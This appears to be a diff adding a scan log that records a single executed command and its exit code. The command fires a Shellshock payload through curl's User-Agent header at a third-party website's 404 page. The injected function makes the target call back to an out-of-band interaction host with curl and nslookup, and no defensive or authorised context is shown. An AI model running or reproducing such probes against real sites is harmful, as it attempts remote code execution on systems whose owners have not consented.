@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -A '() { :;}; curl -s http://oob50d8936ec6a3.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/c;nslookup oob50d8936ec6a3.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in' 'https://www.infinitycapital.bh/404?q=test'
+# exit_code: 0
+# ---
+
